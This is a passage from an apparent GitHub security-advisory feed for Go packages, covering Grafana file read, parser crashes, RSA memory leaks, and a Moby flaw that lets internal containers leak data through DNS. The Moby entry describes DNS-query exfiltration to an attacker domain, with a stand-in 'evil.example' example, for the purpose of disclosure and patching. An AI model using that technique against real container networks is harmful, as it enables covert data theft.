<li><a href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-19T20:06:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana/pkg/tsdb/mysql] Grafana Arbitrary File Read]]></title>
        <id>https://github.com/advisories/GHSA-4pwp-cx67-5cpx</id>
        <link href="https://github.com/advisories/GHSA-4pwp-cx67-5cpx"/>
        <updated>2024-03-22T18:29:33.000Z</updated>
        <content type="html"><![CDATA[<p>Grafana &lt;= 6.4.3 has an Arbitrary File Read vulnerability, which could be exploited by an authenticated attacker that has privileges to modify the data source configurations.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-19499">https://nvd.nist.gov/vuln/detail/CVE-2019-19499</a></li>
<li><a href="https://github.com/grafana/grafana/pull/20192">https://github.com/grafana/grafana/pull/20192</a></li>
<li><a href="https://github.com/grafana/grafana/blob/master/CHANGELOG.md#644-2019-11-06">https://github.com/grafana/grafana/blob/master/CHANGELOG.md#644-2019-11-06</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20200918-0003/">https://security.netapp.com/advisory/ntap-20200918-0003/</a></li>
<li><a href="https://swarm.ptsecurity.com/grafana-6-4-3-arbitrary-file-read/">https://swarm.ptsecurity.com/grafana-6-4-3-arbitrary-file-read/</a></li>
<li><a href="https://github.com/advisories/GHSA-4pwp-cx67-5cpx">https://github.com/advisories/GHSA-4pwp-cx67-5cpx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4pwp-cx67-5cpx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-31T23:11:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[simonwaldherr.de/go/zplgfa] Index out of bounds leading to crash]]></title>
        <id>https://github.com/advisories/GHSA-xgmm-3vvr-6c8j</id>
        <link href="https://github.com/advisories/GHSA-xgmm-3vvr-6c8j"/>
        <updated>2024-03-21T18:58:12.000Z</updated>
        <content type="html"><![CDATA[<p>ZPLGFA 1.1.1 allows attackers to cause a panic (because of an integer index out of range during a ConvertToGraphicField call) via an image of zero width. NOTE: it is unclear whether there are common use cases in which this panic could have any security consequence</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36307">https://nvd.nist.gov/vuln/detail/CVE-2023-36307</a></li>
<li><a href="https://github.com/SimonWaldherr/zplgfa/pull/6">https://github.com/SimonWaldherr/zplgfa/pull/6</a></li>
<li><a href="https://github.com/SimonWaldherr/zplgfa/commit/c0d018ffa921cd2460b80f766b7969fbe63678fc">https://github.com/SimonWaldherr/zplgfa/commit/c0d018ffa921cd2460b80f766b7969fbe63678fc</a></li>
<li><a href="https://github.com/advisories/GHSA-xgmm-3vvr-6c8j">https://github.com/advisories/GHSA-xgmm-3vvr-6c8j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xgmm-3vvr-6c8j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-09-05T06:30:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/disintegration/imaging] Crash when processing crafted TIFF files]]></title>
        <id>https://github.com/advisories/GHSA-q7pp-wcgr-pffx</id>
        <link href="https://github.com/advisories/GHSA-q7pp-wcgr-pffx"/>
        <updated>2024-03-21T18:57:47.000Z</updated>
        <content type="html"><![CDATA[<p>Disintegration Imaging 1.6.2 allows attackers to cause a panic (because of an integer index out of range during a Grayscale call) via a crafted TIFF file to the scan function of scanner.go. NOTE: it is unclear whether there are common use cases in which this panic could have any security consequence</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36308">https://nvd.nist.gov/vuln/detail/CVE-2023-36308</a></li>
<li><a href="https://github.com/disintegration/imaging/issues/165">https://github.com/disintegration/imaging/issues/165</a></li>
<li><a href="https://github.com/disintegration/imaging/releases/tag/v1.6.2">https://github.com/disintegration/imaging/releases/tag/v1.6.2</a></li>
<li><a href="https://github.com/advisories/GHSA-q7pp-wcgr-pffx">https://github.com/advisories/GHSA-q7pp-wcgr-pffx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q7pp-wcgr-pffx</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-09-05T06:30:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/microsoft/go-crypto-openssl/openssl] Memory leaks in code encrypting and verifying RSA payloads]]></title>
        <id>https://github.com/advisories/GHSA-78hx-gp6g-7mj6</id>
        <link href="https://github.com/advisories/GHSA-78hx-gp6g-7mj6"/>
        <updated>2024-03-21T14:05:20.000Z</updated>
        <content type="html"><![CDATA[<p>Using crafted public RSA keys which are not compliant with SP 800-56B can cause a small memory leak when encrypting and verifying payloads.</p>
<p>An attacker can leverage this flaw to gradually erode available memory to the point where the host crashes for lack of resources. Upon restart the attacker would have to begin again, but nevertheless there is the potential to deny service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6">https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6</a></li>
<li><a href="https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136">https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136</a></li>
<li><a href="https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f">https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f</a></li>
<li><a href="https://github.com/golang-fips/openssl/releases/tag/v2.0.1">https://github.com/golang-fips/openssl/releases/tag/v2.0.1</a></li>
<li><a href="https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9">https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9</a></li>
<li><a href="https://github.com/advisories/GHSA-78hx-gp6g-7mj6">https://github.com/advisories/GHSA-78hx-gp6g-7mj6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78hx-gp6g-7mj6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-20T18:10:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/golang-fips/openssl/v2] Memory leaks in code encrypting and verifying RSA payloads]]></title>
        <id>https://github.com/advisories/GHSA-78hx-gp6g-7mj6</id>
        <link href="https://github.com/advisories/GHSA-78hx-gp6g-7mj6"/>
        <updated>2024-03-21T14:05:20.000Z</updated>
        <content type="html"><![CDATA[<p>Using crafted public RSA keys which are not compliant with SP 800-56B can cause a small memory leak when encrypting and verifying payloads.</p>
<p>An attacker can leverage this flaw to gradually erode available memory to the point where the host crashes for lack of resources. Upon restart the attacker would have to begin again, but nevertheless there is the potential to deny service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6">https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6</a></li>
<li><a href="https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136">https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136</a></li>
<li><a href="https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f">https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f</a></li>
<li><a href="https://github.com/golang-fips/openssl/releases/tag/v2.0.1">https://github.com/golang-fips/openssl/releases/tag/v2.0.1</a></li>
<li><a href="https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9">https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9</a></li>
<li><a href="https://github.com/advisories/GHSA-78hx-gp6g-7mj6">https://github.com/advisories/GHSA-78hx-gp6g-7mj6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78hx-gp6g-7mj6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-20T18:10:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/microsoft/go-crypto-openssl] Memory leaks in code encrypting and verifying RSA payloads]]></title>
        <id>https://github.com/advisories/GHSA-78hx-gp6g-7mj6</id>
        <link href="https://github.com/advisories/GHSA-78hx-gp6g-7mj6"/>
        <updated>2024-03-21T14:05:20.000Z</updated>
        <content type="html"><![CDATA[<p>Using crafted public RSA keys which are not compliant with SP 800-56B can cause a small memory leak when encrypting and verifying payloads.</p>
<p>An attacker can leverage this flaw to gradually erode available memory to the point where the host crashes for lack of resources. Upon restart the attacker would have to begin again, but nevertheless there is the potential to deny service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6">https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6</a></li>
<li><a href="https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136">https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136</a></li>
<li><a href="https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f">https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f</a></li>
<li><a href="https://github.com/golang-fips/openssl/releases/tag/v2.0.1">https://github.com/golang-fips/openssl/releases/tag/v2.0.1</a></li>
<li><a href="https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9">https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9</a></li>
<li><a href="https://github.com/advisories/GHSA-78hx-gp6g-7mj6">https://github.com/advisories/GHSA-78hx-gp6g-7mj6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78hx-gp6g-7mj6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-20T18:10:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/golang-fips/openssl/openssl] Memory leaks in code encrypting and verifying RSA payloads]]></title>
        <id>https://github.com/advisories/GHSA-78hx-gp6g-7mj6</id>
        <link href="https://github.com/advisories/GHSA-78hx-gp6g-7mj6"/>
        <updated>2024-03-21T14:05:20.000Z</updated>
        <content type="html"><![CDATA[<p>Using crafted public RSA keys which are not compliant with SP 800-56B can cause a small memory leak when encrypting and verifying payloads.</p>
<p>An attacker can leverage this flaw to gradually erode available memory to the point where the host crashes for lack of resources. Upon restart the attacker would have to begin again, but nevertheless there is the potential to deny service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6">https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6</a></li>
<li><a href="https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136">https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136</a></li>
<li><a href="https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f">https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f</a></li>
<li><a href="https://github.com/golang-fips/openssl/releases/tag/v2.0.1">https://github.com/golang-fips/openssl/releases/tag/v2.0.1</a></li>
<li><a href="https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9">https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9</a></li>
<li><a href="https://github.com/advisories/GHSA-78hx-gp6g-7mj6">https://github.com/advisories/GHSA-78hx-gp6g-7mj6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78hx-gp6g-7mj6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-20T18:10:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/golang-fips/go] Memory leaks in code encrypting and verifying RSA payloads]]></title>
        <id>https://github.com/advisories/GHSA-78hx-gp6g-7mj6</id>
        <link href="https://github.com/advisories/GHSA-78hx-gp6g-7mj6"/>
        <updated>2024-03-21T14:05:20.000Z</updated>
        <content type="html"><![CDATA[<p>Using crafted public RSA keys which are not compliant with SP 800-56B can cause a small memory leak when encrypting and verifying payloads.</p>
<p>An attacker can leverage this flaw to gradually erode available memory to the point where the host crashes for lack of resources. Upon restart the attacker would have to begin again, but nevertheless there is the potential to deny service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6">https://github.com/golang-fips/openssl/security/advisories/GHSA-78hx-gp6g-7mj6</a></li>
<li><a href="https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136">https://github.com/golang-fips/openssl/commit/85d31d0d257ce842c8a1e63c4d230ae850348136</a></li>
<li><a href="https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f">https://github.com/microsoft/go-crypto-openssl/commit/104fe7f6912788d2ad44602f77a0a0a62f1f259f</a></li>
<li><a href="https://github.com/golang-fips/openssl/releases/tag/v2.0.1">https://github.com/golang-fips/openssl/releases/tag/v2.0.1</a></li>
<li><a href="https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9">https://github.com/microsoft/go-crypto-openssl/releases/tag/v0.2.9</a></li>
<li><a href="https://github.com/advisories/GHSA-78hx-gp6g-7mj6">https://github.com/advisories/GHSA-78hx-gp6g-7mj6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78hx-gp6g-7mj6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-20T18:10:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/docker/docker] Moby's external DNS requests from 'internal' networks could lead to data exfiltration]]></title>
        <id>https://github.com/advisories/GHSA-mq39-4gv4-mvpx</id>
        <link href="https://github.com/advisories/GHSA-mq39-4gv4-mvpx"/>
        <updated>2024-03-20T17:59:53.000Z</updated>
        <content type="html"><![CDATA[<p>Moby is an open source container framework originally developed by Docker Inc. as Docker. It is a key component of Docker Engine, Docker Desktop, and other distributions of container tooling or runtimes. As a batteries-included container runtime, Moby comes with a built-in networking implementation that enables communication between containers, and between containers and external resources.</p>
<p>Moby's networking implementation allows for creating and using many networks, each with their own subnet and gateway. This feature is frequently referred to as custom networks, as each network can have a different driver, set of parameters, and thus behaviors. When creating a network, the <code>--internal</code> flag is used to designate a network as <em>internal</em>. The <code>internal</code> attribute in a docker-compose.yml file may also be used to mark a network <em>internal</em>, and other API clients may specify the <code>internal</code> parameter as well.</p>
<p>When containers with networking are created, they are assigned unique network interfaces and IP addresses (typically from a non-routable <a href="https://datatracker.ietf.org/doc/html/rfc1918">RFC 1918</a> subnet). The root network namespace (hereafter referred to as the 'host') serves as a router for non-internal networks, with a gateway IP that provides SNAT/DNAT to/from container IPs.</p>
<p>Containers on an <em>internal</em> network may communicate between each other, but are precluded from communicating with any networks the host has access to (LAN or WAN) as no default route is configured, and firewall rules are set up to drop all outgoing traffic. Communication with the gateway IP address (and thus appropriately configured host services) is possible, and the host may communicate with any container IP directly.</p>
<p>In addition to configuring the Linux kernel's various networking features to enable container networking, <code>dockerd</code> directly provides some services to container networks. Principal among these is serving as a resolver, enabling service discovery (looking up other containers on the network by name), and resolution of names from an upstream resolver.</p>
<p>When a DNS request for a name that does not correspond to a container is received, the request is forwarded to the configured upstream resolver (by default, the host's configured resolver). This request is made from the container network namespace: the level of access and routing of traffic is the same as if the request was made by the container itself.</p>
<p>As a consequence of this design, containers solely attached to <em>internal</em> network(s) will be unable to resolve names using the upstream resolver, as the container itself is unable to communicate with that nameserver. Only the names of containers also attached to the internal network are able to be resolved.</p>
<p>Many systems will run a local forwarding DNS resolver, typically present on a loopback address (<code>127.0.0.0/8</code>), such as systemd-resolved or dnsmasq. Common loopback address examples include <code>127.0.0.1</code> or <code>127.0.0.53</code>. As the host and any containers have separate loopback devices, a consequence of the design described above is that containers are unable to resolve names from the host's configured resolver, as they cannot reach these addresses on the host loopback device.</p>
<p>To bridge this gap, and to allow containers to properly resolve names even when a local forwarding resolver is used on a loopback address, <code>dockerd</code> will detect this scenario and instead forward DNS requests from the host/root network namespace. The loopback resolver will then forward the requests to its configured upstream resolvers, as expected.</p>
<h2 id="impact">Impact</h2>
<p>Because <code>dockerd</code> will forward DNS requests to the host loopback device, bypassing the container network namespace's normal routing semantics entirely, <em>internal</em> networks can unexpectedly forward DNS requests to an external nameserver.</p>
<p>By registering a domain for which they control the authoritative nameservers, an attacker could arrange for a compromised container to exfiltrate data by encoding it in DNS queries that will eventually be answered by their nameservers. For example, if the domain <code>evil.example</code> was registered, the authoritative nameserver(s) for that domain could (eventually and indirectly) receive a request for <code>this-is-a-secret.evil.example</code>.</p>
<p>Docker Desktop is not affected, as Docker Desktop always runs an internal resolver on a RFC 1918 address.</p>
<h2 id="patches">Patches</h2>
<p>Moby releases 26.0.0-rc3, 25.0.5 (released) and 23.0.11 (to be released) are patched to prevent forwarding DNS requests from internal networks.</p>
<h2 id="workarounds">Workarounds</h2>
<ul>
<li>Run containers intended to be solely attached to <em>internal</em> networks with a custom upstream address (<code>--dns</code> argument to <code>docker run</code>, or API equivalent), which will force all upstream DNS queries to be resolved from the container network namespace.</li>
</ul>
<h2 id="background">Background</h2>
<ul>
<li>yair zak originally reported this issue to the Docker security team.</li>
<li>PR <a href="https://github.com/moby/moby/pull/46609">https://github.com/moby/moby/pull/46609</a> was opened in public to fix this issue, as it was not originally considered to have a security implication.</li>
<li><a href="https://docs.docker.com/network/drivers/ipvlan/#:~:text=If%20the%20parent,the%20network%20completely">The official documentation</a> claims that "the <code>--internal</code> flag that will completely isolate containers on a network from any communications external to that network," which necessitated this advisory and CVE.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/security/advisories/GHSA-mq39-4gv4-mvpx">https://github.com/moby/moby/security/advisories/GHSA-mq39-4gv4-mvpx</a></li>
<li><a href="https://github.com/moby/moby/pull/46609">https://github.com/moby/moby/pull/46609</a></li>
<li><a href="https://github.com/advisories/GHSA-mq39-4gv4-mvpx">https://github.com/advisories/GHSA-mq39-4gv4-mvpx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mq39-4gv4-mvpx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-20T17:59:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/docker/docker] Moby's external DNS requests from 'internal' networks could lead to data exfiltration]]></title>
        <id>https://github.com/advisories/GHSA-mq39-4gv4-mvpx</id>
        <link href="https://github.com/advisories/GHSA-mq39-4gv4-mvpx"/>
        <updated>2024-03-20T17:59:53.000Z</updated>
        <content type="html"><![CDATA[<p>Moby is an open source container framework originally developed by Docker Inc. as Docker. It is a key component of Docker Engine, Docker Desktop, and other distributions of container tooling or runtimes. As a batteries-included container runtime, Moby comes with a built-in networking implementation that enables communication between containers, and between containers and external resources.</p>
<p>Moby's networking implementation allows for creating and using many networks, each with their own subnet and gateway. This feature is frequently referred to as custom networks, as each network can have a different driver, set of parameters, and thus behaviors. When creating a network, the <code>--internal</code> flag is used to designate a network as <em>internal</em>. The <code>internal</code> attribute in a docker-compose.yml file may also be used to mark a network <em>internal</em>, and other API clients may specify the <code>internal</code> parameter as well.</p>
<p>When containers with networking are created, they are assigned unique network interfaces and IP addresses (typically from a non-routable <a href="https://datatracker.ietf.org/doc/html/rfc1918">RFC 1918</a> subnet). The root network namespace (hereafter referred to as the 'host') serves as a router for non-internal networks, with a gateway IP that provides SNAT/DNAT to/from container IPs.</p>
<p>Containers on an <em>internal</em> network may communicate between each other, but are precluded from communicating with any networks the host has access to (LAN or WAN) as no default route is configured, and firewall rules are set up to drop all outgoing traffic. Communication with the gateway IP address (and thus appropriately configured host services) is possible, and the host may communicate with any container IP directly.</p>
<p>In addition to configuring the Linux kernel's various networking features to enable container networking, <code>dockerd</code> directly provides some services to container networks. Principal among these is serving as a resolver, enabling service discovery (looking up other containers on the network by name), and resolution of names from an upstream resolver.</p>
<p>When a DNS request for a name that does not correspond to a container is received, the request is forwarded to the configured upstream resolver (by default, the host's configured resolver). This request is made from the container network namespace: the level of access and routing of traffic is the same as if the request was made by the container itself.</p>
<p>As a consequence of this design, containers solely attached to <em>internal</em> network(s) will be unable to resolve names using the upstream resolver, as the container itself is unable to communicate with that nameserver. Only the names of containers also attached to the internal network are able to be resolved.</p>
<p>Many systems will run a local forwarding DNS resolver, typically present on a loopback address (<code>127.0.0.0/8</code>), such as systemd-resolved or dnsmasq. Common loopback address examples include <code>127.0.0.1</code> or <code>127.0.0.53</code>. As the host and any containers have separate loopback devices, a consequence of the design described above is that containers are unable to resolve names from the host's configured resolver, as they cannot reach these addresses on the host loopback device.</p>
<p>To bridge this gap, and to allow containers to properly resolve names even when a local forwarding resolver is used on a loopback address, <code>dockerd</code> will detect this scenario and instead forward DNS requests from the host/root network namespace. The loopback resolver will then forward the requests to its configured upstream resolvers, as expected.</p>
<h2 id="impact">Impact</h2>
<p>Because <code>dockerd</code> will forward DNS requests to the host loopback device, bypassing the container network namespace's normal routing semantics entirely, <em>internal</em> networks can unexpectedly forward DNS requests to an external nameserver.</p>
<p>By registering a domain for which they control the authoritative nameservers, an attacker could arrange for a compromised container to exfiltrate data by encoding it in DNS queries that will eventually be answered by their nameservers. For example, if the domain <code>evil.example</code> was registered, the authoritative nameserver(s) for that domain could (eventually and indirectly) receive a request for <code>this-is-a-secret.evil.example</code>.</p>
<p>Docker Desktop is not affected, as Docker Desktop always runs an internal resolver on a RFC 1918 address.</p>
<h2 id="patches">Patches</h2>
<p>Moby releases 26.0.0-rc3, 25.0.5 (released) and 23.0.11 (to be released) are patched to prevent forwarding DNS requests from internal networks.</p>
<h2 id="workarounds">Workarounds</h2>
<ul>
<li>Run containers intended to be solely attached to <em>internal</em> networks with a custom upstream address (<code>--dns</code> argument to <code>docker run</code>, or API equivalent), which will force all upstream DNS queries to be resolved from the container network namespace.</li>
</ul>
<h2 id="background">Background</h2>
<ul>
<li>yair zak originally reported this issue to the Docker security team.</li>
<li>PR <a href="https://github.com/moby/moby/pull/46609">https://github.com/moby/moby/pull/46609</a> was opened in public to fix this issue, as it was not originally considered to have a security implication.</li>
<li><a href="https://docs.docker.com/network/drivers/ipvlan/#:~:text=If%20the%20parent,the%20network%20completely">The official documentation</a> claims that "the <code>--internal</code> flag that will completely isolate containers on a network from any communications external to that network," which necessitated this advisory and CVE.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/security/advisories/GHSA-mq39-4gv4-mvpx">https://github.com/moby/moby/security/advisories/GHSA-mq39-4gv4-mvpx</a></li>
<li><a href="https://github.com/moby/moby/pull/46609">https://github.com/moby/moby/pull/46609</a></li>
<li><a href="https://github.com/advisories/GHSA-mq39-4gv4-mvpx">https://github.com/advisories/GHSA-mq39-4gv4-mvpx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mq39-4gv4-mvpx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-20T17:59:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/docker/docker] Moby's external DNS requests from 'internal' networks could lead to data exfiltration]]></title>
        <id>https://github.com/advisories/GHSA-mq39-4gv4-mvpx</id>
        <link href="https://github.com/advisories/GHSA-mq39-4gv4-mvpx"/>
        <updated>2024-03-20T17:59:53.000Z</updated>
        <content type="html"><![CDATA[<p>Moby is an open source container framework originally developed by Docker Inc. as Docker. It is a key component of Docker Engine, Docker Desktop, and other distributions of container tooling or runtimes. As a batteries-included container runtime, Moby comes with a built-in networking implementation that enables communication between containers, and between containers and external resources.</p>
<p>Moby's networking implementation allows for creating and using many networks, each with their own subnet and gateway. This feature is frequently referred to as custom networks, as each network can have a different driver, set of parameters, and thus behaviors. When creating a network, the <code>--internal</code> flag is used to designate a network as <em>internal</em>. The <code>internal</code> attribute in a docker-compose.yml file may also be used to mark a network <em>internal</em>, and other API clients may specify the <code>internal</code> parameter as well.</p>
<p>When containers with networking are created, they are assigned unique network interfaces and IP addresses (typically from a non-routable <a href="https://datatracker.ietf.org/doc/html/rfc1918">RFC 1918</a> subnet). The root network namespace (hereafter referred to as the 'host') serves as a router for non-internal networks, with a gateway IP that provides SNAT/DNAT to/from container IPs.</p>
<p>Containers on an <em>internal</em> network may communicate between each other, but are precluded from communicating with any networks the host has access to (LAN or WAN) as no default route is configured, and firewall rules are set up to drop all outgoing traffic. Communication with the gateway IP address (and thus appropriately configured host services) is possible, and the host may communicate with any container IP directly.</p>
<p>In addition to configuring the Linux kernel's various networking features to enable container networking, <code>dockerd</code> directly provides some services to container networks. Principal among these is serving as a resolver, enabling service discovery (looking up other containers on the network by name), and resolution of names from an upstream resolver.</p>
<p>When a DNS request for a name that does not correspond to a container is received, the request is forwarded to the configured upstream resolver (by default, the host's configured resolver). This request is made from the container network namespace: the level of access and routing of traffic is the same as if the request was made by the container itself.</p>
<p>As a consequence of this design, containers solely attached to <em>internal</em> network(s) will be unable to resolve names using the upstream resolver, as the container itself is unable to communicate with that nameserver. Only the names of containers also attached to the internal network are able to be resolved.</p>
<p>Many systems will run a local forwarding DNS resolver, typically present on a loopback address (<code>127.0.0.0/8</code>), such as systemd-resolved or dnsmasq. Common loopback address examples include <code>127.0.0.1</code> or <code>127.0.0.53</code>. As the host and any containers have separate loopback devices, a consequence of the design described above is that containers are unable to resolve names from the host's configured resolver, as they cannot reach these addresses on the host loopback device.</p>
<p>To bridge this gap, and to allow containers to properly resolve names even when a local forwarding resolver is used on a loopback address, <code>dockerd</code> will detect this scenario and instead forward DNS requests from the host/root network namespace. The loopback resolver will then forward the requests to its configured upstream resolvers, as expected.</p>
<h2 id="impact">Impact</h2>
<p>Because <code>dockerd</code> will forward DNS requests to the host loopback device, bypassing the container network namespace's normal routing semantics entirely, <em>internal</em> networks can unexpectedly forward DNS requests to an external nameserver.</p>
<p>By registering a domain for which they control the authoritative nameservers, an attacker could arrange for a compromised container to exfiltrate data by encoding it in DNS queries that will eventually be answered by their nameservers. For example, if the domain <code>evil.example</code> was registered, the authoritative nameserver(s) for that domain could (eventually and indirectly) receive a request for <code>this-is-a-secret.evil.example</code>.</p>
<p>Docker Desktop is not affected, as Docker Desktop always runs an internal resolver on a RFC 1918 address.</p>
<h2 id="patches">Patches</h2>
<p>Moby releases 26.0.0-rc3, 25.0.5 (released) and 23.0.11 (to be released) are patched to prevent forwarding DNS requests from internal networks.</p>
<h2 id="workarounds">Workarounds</h2>
<ul>
<li>Run containers intended to be solely attached to <em>internal</em> networks with a custom upstream address (<code>--dns</code> argument to <code>docker run</code>, or API equivalent), which will force all upstream DNS queries to be resolved from the container network namespace.</li>
</ul>
<h2 id="background">Background</h2>
<ul>
<li>yair zak originally reported this issue to the Docker security team.</li>
<li>PR <a href="https://github.com/moby/moby/pull/46609">https://github.com/moby/moby/pull/46609</a> was opened in public to fix this issue, as it was not originally considered to have a security implication.</li>
<li><a href="https://docs.docker.com/network/drivers/ipvlan/#:~:text=If%20the%20parent,the%20network%20completely">The official documentation</a> claims that "the <code>--internal</code> flag that will completely isolate containers on a network from any communications external to that network," which necessitated this advisory and CVE.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/security/advisories/GHSA-mq39-4gv4-mvpx">https://github.com/moby/moby/security/advisories/GHSA-mq39-4gv4-mvpx</a></li>
<li><a href="https://github.com/moby/moby/pull/46609">https://github.com/moby/moby/pull/46609</a></li>
<li><a href="https://github.com/advisories/GHSA-mq39-4gv4-mvpx">https://github.com/advisories/GHSA-mq39-4gv4-mvpx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mq39-4gv4-mvpx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-20T17:59:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/docker/docker] Classic builder cache poisoning]]></title>
        <id>https://github.com/advisories/GHSA-xw73-rw38-6vjc</id>
        <link href="https://github.com/advisories/GHSA-xw73-rw38-6vjc"/>
        <updated>2024-03-20T17:07:44.000Z</updated>
        <content type="html"><![CDATA[<p>The classic builder cache system is prone to cache poisoning if the image is built <code>FROM scratch</code>.
